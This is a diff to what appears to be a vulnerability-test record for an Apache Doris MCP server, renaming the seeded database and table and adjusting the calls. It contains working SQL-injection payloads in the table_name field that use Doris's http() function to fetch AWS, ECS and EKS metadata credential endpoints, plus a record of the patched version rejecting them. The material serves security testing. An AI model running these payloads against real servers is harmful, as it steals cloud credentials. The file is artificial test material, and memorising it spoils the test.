@@ -147338,20 +147338,14 @@
           {
             "option": "--db-user",
             "value": "root",
-            "reason": "Documented default DB user; root carries ADMIN_PRIV, which the http() TVF requires. This is the default MCP deployment, not an added privilege.",
+            "reason": "Documented default DB user; root carries ADMIN_PRIV, which the http() TVF requires. The launch no longer passes --db-user, so the server's documented default root applies. This is the default MCP deployment, not an added privilege.",
             "documentation": "README CLI table: --db-user default root; Doris root has ADMIN_PRIV by default."
           },
           {
             "option": "--db-host / --db-port",
             "value": "doris / 9030",
-            "reason": "The server connects to the real Apache Doris FE (MySQL protocol port 9030) provisioned by the builder.",
+            "reason": "The launch passes --db-host doris, the real Apache Doris FE provisioned by the builder; --db-port is no longer passed and falls to the documented default 9030 (the FE MySQL-protocol port).",
             "documentation": "README CLI table: --db-host (default localhost), --db-port (default 9030)."
-          },
-          {
-            "option": "--db-database",
-            "value": "test_db",
-            "reason": "A database must exist for the server's connection-time validation to pass; the builder creates test_db on the real Doris.",
-            "documentation": "README: immediate database validation at connection time; DB_DATABASE env / --db-database."
           }
         ],
         "seeded_in_layout": [],
@@ -147394,8 +147388,8 @@
             ]
           },
           {
-            "item": "Database test_db on the Doris backend",
-            "reason": "The server runs an immediate database validation at connection time, so a database named by --db-database must exist. The backend lifecycle creates test_db on the real Doris with a throwaway MySQL-protocol client before the first call. Neutral name, documented format, holds no nonce.",
+            "item": "Database demo on the Doris backend",
+            "reason": "The seeded quick-start sample lives in database demo. The backend lifecycle creates it on the real Doris with a throwaway MySQL-protocol client before the first call. Neutral name from the published sample, holds no nonce.",
             "returned_by": [
               "get_db_list"
             ],
@@ -147414,8 +147408,8 @@
             ]
           },
           {
-            "item": "Table t1 (id INT) in test_db",
-            "reason": "The benign call reads a real table's comment, and the schema provisioning gates the backend-ready wait on a bucketed table it can create and read. The backend lifecycle creates test_db.t1 before the first call. Neutral name, holds no nonce.",
+            "item": "Table mytable in demo (the Doris quick-start sample)",
+            "reason": "The benign call reads the sample table's comment, and the schema provisioning gates the backend-ready wait on a bucketed table it can create and read. The backend lifecycle seeds demo.mytable (k1..k4 with its column and table comments, four rows) before the first call. Published sample, holds no nonce.",
             "returned_by": [
               "get_db_table_list"
             ],
@@ -147524,8 +147518,8 @@
             ]
           },
           {
-            "item": "Launch value --db-database = test_db",
-            "reason": "Selects the connection's default database; the connection pool is opened on it, so every query tool runs against test_db unless the call names another schema.",
+            "item": "Default database information_schema (--db-database not passed)",
+            "reason": "The launch no longer passes --db-database, so the connection opens on the server's documented default information_schema; every query tool runs against it unless the call names another schema, and the sample and the exploit and benign calls name demo.",
             "returned_by": [
               "get_adbc_connection_info"
             ],
@@ -147562,12 +147556,12 @@
         "fallback_scope": null,
         "fallback_documentation": null,
         "exploit_calls": [
-          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"test_db\")  # imds",
-          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.170.2/v2/credentials/\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"test_db\")  # ecs-task-credentials",
-          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.170.23/v1/credentials\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"test_db\")  # eks-pod-identity"
+          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"demo\")  # imds",
+          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.170.2/v2/credentials/\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"demo\")  # ecs-task-credentials",
+          "get_table_comment(table_name=\"x' UNION SELECT c1 FROM http(\\\"uri\\\"=\\\"http://169.254.170.23/v1/credentials\\\",\\\"format\\\"=\\\"csv\\\") -- \", db_name=\"demo\")  # eks-pod-identity"
         ],
-        "benign_call": "get_table_comment(table_name=\"t1\", db_name=\"test_db\")",
-        "patched_result": "On 0.6.1 every exploit call returns success:false with error 'Invalid table name ... Table name contains invalid characters' (sql_security_utils.validate_identifier); no nonce surfaces. The benign call still returns success:true (empty comment), no error.",
+        "benign_call": "get_table_comment(table_name=\"mytable\", db_name=\"demo\")",
+        "patched_result": "On 0.6.1 every exploit call returns success:false with error 'Invalid table name ... Table name contains invalid characters' (sql_security_utils.validate_identifier); no nonce surfaces. The benign call returns success:true with the sample table's comment 'my first table', no error.",
         "attempts": 1
       },
       {
